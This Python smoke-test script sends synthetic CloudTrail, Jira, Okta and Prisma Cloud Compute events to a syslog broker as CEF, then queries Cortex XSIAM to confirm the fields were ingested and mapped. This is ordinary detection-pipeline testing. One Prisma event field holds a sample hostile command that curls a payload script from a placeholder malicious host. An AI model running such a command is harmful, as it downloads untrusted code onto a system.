#!/usr/bin/env python3
"""Batch 4 — JSON-native vendors smoked via CEF-over-syslog transport.

Builds on the Alibaba PoC validation. Same pattern: CEF header carries vendor +
product (drives PR INGEST routing), CEF extensions carry the field names the
MR reads, broker auto-tags + forwards to XSIAM.

VENDORS THIS BATCH
==================
  1. amazon_aws_raw           (CloudTrail — eventId, eventName, eventType, awsRegion,
                               eventSource, requestID, sourceIPAddress, userIdentity*)
  2. atlassian_jira_raw       (created, authorKey, authorAccountId, summary,
                               objectItem, remoteAddress, changedValues, category)
  3. okta_okta_raw            (eventType, actor [JSON str], client [JSON str],
                               outcome [JSON str], target [array]) — NESTED JSON TEST
  4. prisma_cloud_compute_raw (type, host, user, message, time, severity, image)

Verifies both raw column population AND XDM materialization (xdm.* fields).
"""

from __future__ import annotations

import json
import os
import socket
import time
import urllib.request
from datetime import datetime, timezone

BROKER = ("10.10.0.8", 514)
TOKEN = os.environ["MCP_TOKEN"]
MCP = "http://phantom-connector-xsiam-Cortex_XSIAM:9000/mcp"

BATCH = int(time.time())
ts_bsd = datetime.now(timezone.utc).strftime("%b %d %H:%M:%S")


# ============================================================
# Per-vendor synthetic events (CEF-wrapped)
# ============================================================

# (1) AWS CloudTrail — amazon_aws_raw
# PR: filter _log_type = "Cloud Audit Log" and to_string(eventTime) matches RFC3339
# MR fields: eventId, eventName, eventType, eventVersion, eventCategory,
#            requestID, eventSource, awsRegion, sourceIPAddress, userAgent,
#            userIdentity (JSON nested), tlsDetails (JSON), errorCode, errorMessage,
#            requestParameters, responseElements, resources, recipientAccountId
AWS_MARKER = f"aws-cloudtrail-{BATCH}"
aws_user_identity = json.dumps({
    "type": "IAMUser", "principalId": "AIDAEXAMPLE12345",
    "userName": "alice", "arn": "arn:aws:iam::123456789012:user/alice",
    "accountId": "123456789012"
}).replace(" ", "")
aws_resources = json.dumps([{"ARN":"arn:aws:s3:::test-bucket-cef","type":"AWS::S3::Bucket","accountId":"123456789012"}]).replace(" ", "")
aws_tls = json.dumps({"tlsVersion":"TLSv1.2","cipherSuite":"ECDHE-RSA-AES128-GCM-SHA256","clientProvidedHostHeader":"s3.amazonaws.com"}).replace(" ", "")
aws_event_time = datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")
aws_ext = {
    "_log_type": "Cloud Audit Log",          # PR filter requirement
    "eventTime": aws_event_time,              # PR filter requirement (RFC3339)
    "eventId": AWS_MARKER,                    # MR: xdm.event.id (marker)
    "eventName": "GetObject",                 # MR: xdm.event.type, xdm.event.operation_sub_type
    "eventType": "AwsApiCall",                # MR: xdm.event.original_event_type
    "eventVersion": "1.11",                   # MR: xdm.observer.content_version
    "eventCategory": "Data",                  # MR: xdm.observer.type
    "eventSource": "s3.amazonaws.com",        # MR: xdm.observer.name
    "awsRegion": "us-east-1",                 # MR: xdm.target.cloud.region
    "requestID": f"REQ-{BATCH}",              # MR: xdm.network.session_id
    "sourceIPAddress": "203.0.113.45",        # MR: xdm.source.ipv4 / public_addresses
    "userAgent": "aws-cli/2.0.0 Python/3.9",  # MR: xdm.source.user_agent
    "userIdentity": aws_user_identity,        # MR: nested json — uses userIdentity -> arn, accountId etc
    "resources": aws_resources,               # MR: nested json — uses resources -> [ARN, type, accountId]
    "tlsDetails": aws_tls,                    # MR: nested json — uses tlsDetails -> cipherSuite, tlsVersion
    "recipientAccountId": "123456789012",     # MR: xdm.target.cloud.project_id
    "sharedEventID": f"shared-{BATCH}",       # MR: xdm.session_context_id
    "vpcEndpointId": "vpce-abc123",           # MR: xdm.source.host.device_id
}
aws_cef = (
    f"<134>{ts_bsd} smoke-host CEF:0|amazon|aws|1.11|CloudTrail|{aws_ext['eventName']}|3|"
    + " ".join(f"{k}={v}" for k, v in aws_ext.items())
)


# (2) Jira — atlassian_jira_raw
# PR: filter created ~= "\d{4}\-\d{2}\-\d{2}T\d{2}\:\d{2}\:\d{2}\.\d{3}[\+|\-]\d{4}"
# MR fields: created, authorKey, authorAccountId, summary, category, remoteAddress,
#            changedValues, objectItem
JIRA_MARKER = f"jira-{BATCH}"
jira_created = datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.000+0000")
jira_object_item = json.dumps({"id":"10001","name":"alice","typeName":"USER"}).replace(" ", "")
jira_changed = json.dumps({"fieldName":"status","changedTo":"In Progress","changedFrom":"To Do"}).replace(" ", "")
jira_ext = {
    "created": jira_created,                 # PR filter requirement
    "summary": f"PROJ-{JIRA_MARKER}: Test issue created via CEF smoke",  # MR: xdm.event.operation
    "authorKey": "alice@corp.example.com",   # MR: xdm.source.user.username (also marker carrier)
    "authorAccountId": "557058:abcdef01-2345-6789-abcd-ef0123456789",   # MR: xdm.source.user.identifier
    "remoteAddress": "198.51.100.42",        # MR: xdm.source.ipv4
    "category": "issue-updated",             # MR: xdm.event.operation_sub_type
    "objectItem": jira_object_item,          # MR: nested — uses objectItem -> id, name, typeName
    "changedValues": jira_changed,           # MR: nested — uses changedValues -> changedTo
}
jira_cef = (
    f"<134>{ts_bsd} smoke-host CEF:0|atlassian|jira|1.0|JIRA_AUDIT|{jira_ext['category']}|3|"
    + " ".join(f"{k}={v}" for k, v in jira_ext.items())
)


# (3) Okta — okta_okta_raw  (NESTED JSON TEST)
# PR: filter published ~= ".*T\d{2}:\d{2}:\d{2}[\.\dZ]+"
# MR fields (top-level): uuid, eventType, severity, displayMessage, legacyEventType,
#            actor (JSON), client (JSON), outcome (JSON), target (array of JSON),
#            authenticationContext (JSON), debugContext (JSON), securityContext (JSON),
#            transaction (JSON), request (JSON), published
OKTA_MARKER = f"okta-{BATCH}"
okta_published = datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.000Z")
okta_actor = json.dumps({"id":f"00u{BATCH}","type":"User","displayName":"Alice CEF","alternateId":f"alice-{OKTA_MARKER}@corp.example.com"}).replace(" ", "")
okta_client = json.dumps({"ipAddress":"203.0.113.50","userAgent":{"rawUserAgent":"Mozilla/5.0 (CEF smoke)","os":"Mac OS X","browser":"CHROME"},"device":"Computer","geographicalContext":{"city":"San Francisco","country":"United States","state":"California","geolocation":{"lat":37.7,"lon":-122.4}},"zone":"null"}).replace(" ", "")
okta_outcome = json.dumps({"result":"SUCCESS","reason":""}).replace(" ", "")
okta_target = json.dumps([{"id":"appinst-001","type":"AppInstance","alternateId":"Salesforce","displayName":"Salesforce.com"}]).replace(" ", "")
okta_auth_ctx = json.dumps({"authenticationProvider":{"credentialProvider":"OKTA_AUTHENTICATION_PROVIDER","credentialType":"PASSWORD","externalSessionId":f"sess-{BATCH}"}}).replace(" ", "")
okta_transaction = json.dumps({"id":f"tx-{BATCH}","type":"WEB"}).replace(" ", "")
okta_security_ctx = json.dumps({"asNumber":15169,"asOrg":"Google LLC","isp":"google","domain":"google.com","isProxy":"false"}).replace(" ", "")
okta_request = json.dumps({"ipChain":[{"ip":"203.0.113.50","geographicalContext":{}}]}).replace(" ", "")
okta_ext = {
    "uuid": OKTA_MARKER,                    # MR: xdm.event.id (marker carrier)
    "published": okta_published,            # PR filter requirement
    "eventType": "user.authentication.sso", # MR: xdm.event.original_event_type
    "severity": "INFO",                     # MR: xdm.event.log_level
    "displayMessage": "User single sign on", # MR: xdm.event.description
    "legacyEventType": "core.user_auth.login_success", # MR: xdm.observer.action
    "actor": okta_actor,                    # MR: nested — actor.id, actor.alternateId, actor.type
    "client": okta_client,                  # MR: nested — client.ipAddress, client.userAgent.*, geo
    "outcome": okta_outcome,                # MR: nested — outcome.result, outcome.reason
    "target": okta_target,                  # MR: nested array — target[0].id, .alternateId, .type
    "authenticationContext": okta_auth_ctx, # MR: nested — auth provider
    "transaction": okta_transaction,        # MR: nested — transaction.id
    "securityContext": okta_security_ctx,   # MR: nested — asNumber, asOrg, isProxy
    "request": okta_request,                # MR: nested — request.ipChain[]
}
okta_cef = (
    f"<134>{ts_bsd} smoke-host CEF:0|okta|okta|1.0|OKTA_SSO|{okta_ext['eventType']}|3|"
    + " ".join(f"{k}={v}" for k, v in okta_ext.items())
)


# (4) Prisma Cloud Compute — prisma_cloud_compute_raw
# PR: extract time field from raw_log
# MR fields: type, host, user, message, time, severity, image, container, fqdn,
#            rule, region, accountID, labels, command, osDistro, provider, collections
PRISMA_MARKER = f"prisma-{BATCH}"
prisma_time = datetime.now(timezone.utc).strftime("%b %d, %Y %H:%M:%S")  # PR-friendly format
prisma_labels = json.dumps({"app":"web","baseimage.name":"alpine:3.18","org.opencontainers.image.authors":"corp@example.com","osDistro":"alpine","osVersion":"3.18"}).replace(" ", "")
prisma_ext = {
    "time": prisma_time,                    # PR: parsed via "%h %d %Y %H:%M:%S"
    "type": "audit",                        # MR: xdm.event.type
    "host": "prisma-host-01",               # MR: xdm.target.host.hostname (also marker via marker rule below)
    "user": f"admin-{PRISMA_MARKER}",       # MR: xdm.target.user.username (marker carrier)
    "message": f"User {PRISMA_MARKER} performed audit operation", # MR: xdm.event.description
    "severity": "high",                     # MR: xdm.alert.severity (after coalesce)
    "image": "nginx:1.25-alpine",           # MR: xdm.target.agent.identifier
    "container": "web-frontend",            # MR: xdm.target.process.container_id
    "rule": "Default - alert on suspicious processes",  # MR: xdm.network.rule
    "region": "us-east-1",                  # MR: xdm.target.location.region
    "accountID": "prod-acct-001",           # MR: xdm.target.cloud.project
    "labels": prisma_labels,                # MR: nested — labels.app, labels.osDistro
    "command": "curl https://malicious.example/payload.sh",  # MR: xdm.target.process.command_line
    "osDistro": "alpine",                   # MR: xdm.target.host.os_family discriminator
    "osRelease": "Alpine 3.18.0",           # MR: xdm.target.host.os
    "provider": "AWS",                      # MR: xdm.target.cloud.provider discriminator
    "collections": "Default,Production",    # MR: xdm.target.host.device_category
    "fqdn": f"prisma-{PRISMA_MARKER}.corp.example.com",  # MR: xdm.target.host.fqdn (also marker)
}
prisma_cef = (
    f"<134>{ts_bsd} smoke-host CEF:0|prisma|cloud_compute|1.0|PCC_AUDIT|{prisma_ext['type']}|3|"
    + " ".join(f"{k}={v}" for k, v in prisma_ext.items())
)

SMOKES = [
    {"name": "AWS CloudTrail",         "dataset": "amazon_aws_raw",            "event": aws_cef,    "marker": AWS_MARKER,    "marker_field": "eventId"},
    {"name": "Jira",                   "dataset": "atlassian_jira_raw",        "event": jira_cef,   "marker": JIRA_MARKER,   "marker_field": "summary"},
    {"name": "Okta (nested JSON)",     "dataset": "okta_okta_raw",             "event": okta_cef,   "marker": OKTA_MARKER,   "marker_field": "uuid"},
    {"name": "Prisma Cloud Compute",   "dataset": "prisma_cloud_compute_raw",  "event": prisma_cef, "marker": PRISMA_MARKER, "marker_field": "user"},
]

print("=" * 70)
print(f"BATCH 4 — JSON-native vendors via CEF-over-syslog  ({BATCH})")
print("=" * 70)

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
for s in SMOKES:
    e = s["event"]
    print(f"\n[{s['name']}]  → {BROKER[0]}:{BROKER[1]}  ({len(e)} bytes)")
    print(f"  marker={s['marker']}  marker_field={s['marker_field']}")
    print(f"  CEF[:200]={e[:200]}{'...' if len(e) > 200 else ''}")
    if len(e) >= 1500:
        print(f"  ⚠ OVER UDP MTU 1500 — broker may truncate")
    for _ in range(3):
        sock.sendto(e.encode(), BROKER)
sock.close()
print(f"\nAll events sent. Waiting 120s...")
for i in range(4):
    time.sleep(30)
    print(f"  +{(i+1)*30}s")


# ============================================================
# XSIAM verification
# ============================================================

def post(body, sid=None):
    h = {"Authorization": f"Bearer {TOKEN}", "Content-Type": "application/json",
         "Accept": "application/json, text/event-stream"}
    if sid: h["mcp-session-id"] = sid
    req = urllib.request.Request(MCP, data=json.dumps(body).encode(), headers=h, method="POST")
    with urllib.request.urlopen(req, timeout=180) as r:
        return r.read().decode(), r.headers


def sse(s):
    for ln in s.split("\n"):
        ln = ln.strip()
        if ln.startswith("data:"):
            try:
                f = json.loads(ln[5:].strip())
                if "result" in f:
                    c = f["result"].get("content", [])
                    if c: return json.loads(c[0].get("text", "{}"))
            except: pass
    return {}


_, h = post({"jsonrpc":"2.0","id":1,"method":"initialize",
             "params":{"protocolVersion":"2024-11-05","capabilities":{},"clientInfo":{"name":"b4","version":"1"}}})
sid = h.get("mcp-session-id") or h.get("Mcp-Session-Id")
post({"jsonrpc":"2.0","method":"notifications/initialized","params":{}}, sid)


def xql(q):
    body, _ = post({"jsonrpc":"2.0","id":99,"method":"tools/call",
                    "params":{"name":"run_xql_query","arguments":{"request":{"query":q, "tenant_timeframe":{"relativeTime":900000}}}}}, sid)
    return sse(body)


print("\n" + "=" * 70)
print("VERIFICATION (raw landing + XDM materialization)")
print("=" * 70)

results = []
for s in SMOKES:
    name, dataset, marker, mfield = s["name"], s["dataset"], s["marker"], s["marker_field"]
    print(f"\n[{name}] dataset={dataset}  marker={marker}")

    # Raw landing query
    q = f'dataset = {dataset} | filter {mfield} contains "{marker}" or _raw_log contains "{marker}" | limit 1'
    r = xql(q)
    reply = r.get("reply", {})
    status = reply.get("status", "?")
    n = reply.get("number_of_results", 0)

    if status == "FAIL":
        print(f"  ✗ DATASET DOES NOT EXIST")
        results.append({"name": name, "result": "DATASET_MISSING", "populated_cols": 0, "xdm_cols": 0})
        continue
    if status != "SUCCESS":
        err = r.get("_xql_error") or r.get("error") or "?"
        print(f"  ⚠ status={status}  err={str(err)[:200]}")
        results.append({"name": name, "result": f"ERR_{status}", "populated_cols": 0, "xdm_cols": 0})
        continue
    if n == 0:
        print(f"  ⊘ dataset exists but marker not found (n=0)")
        results.append({"name": name, "result": "NOT_FOUND", "populated_cols": 0, "xdm_cols": 0})
        continue

    row = reply["results"]["data"][0]
    populated = {k:v for k,v in row.items() if v not in (None, "", "null")}
    raw_cols = [k for k in populated if not k.startswith("xdm.") and not k.startswith("_")]
    xdm_cols = [k for k in populated if k.startswith("xdm.")]
    print(f"  ✅ LANDED ({len(populated)} populated cols: {len(raw_cols)} raw, {len(xdm_cols)} xdm)")
    print(f"  raw sample:")
    for k in sorted(raw_cols)[:8]:
        print(f"    {k:30} = {str(populated[k])[:90]}")
    if xdm_cols:
        print(f"  xdm sample:")
        for k in sorted(xdm_cols)[:8]:
            print(f"    {k:40} = {str(populated[k])[:90]}")
    else:
        print(f"  (no xdm.* fields populated — MR may not have fired or no matching MR for this dataset)")
    results.append({"name": name, "result": "LANDED", "populated_cols": len(populated), "raw_cols": len(raw_cols), "xdm_cols": len(xdm_cols)})


# ============================================================
# Summary
# ============================================================

print("\n" + "=" * 70)
print("BATCH 4 SUMMARY")
print("=" * 70)
print(f"  {'vendor':<28}  result        cols  xdm")
print(f"  {'-'*28}  ------------  ----  ---")
for r in results:
    icon = "✅" if r["result"] == "LANDED" else "⚠" if "ERR" in r.get("result","") else "✗"
    xdm = str(r.get("xdm_cols", "-"))
    print(f"  {icon} {r['name']:<26}  {r['result']:<12}  {r.get('populated_cols','-'):>4}  {xdm:>3}")

landed = sum(1 for r in results if r["result"] == "LANDED")
xdm_fired = sum(1 for r in results if r.get("xdm_cols", 0) > 0)
print(f"\n  {landed}/{len(results)} landed raw, {xdm_fired}/{len(results)} fired MR (xdm.* populated)")
